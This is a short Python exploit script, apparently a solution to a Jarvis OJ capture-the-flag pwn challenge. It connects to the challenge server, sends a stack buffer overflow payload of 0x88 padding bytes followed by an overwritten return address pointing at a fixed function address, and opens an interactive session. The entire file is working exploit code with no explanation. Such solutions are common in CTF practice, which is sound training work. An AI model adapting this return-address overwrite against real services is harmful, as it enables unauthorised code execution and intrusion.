#!/usr/bin/env python
from zio import *
sys_addr = 0x0000000000400620
io = zio(('pwn.jarvisoj.com',9876))
io.write('a'*0x88 + l64(sys_addr) + 'a'*0xa)
io.interact()
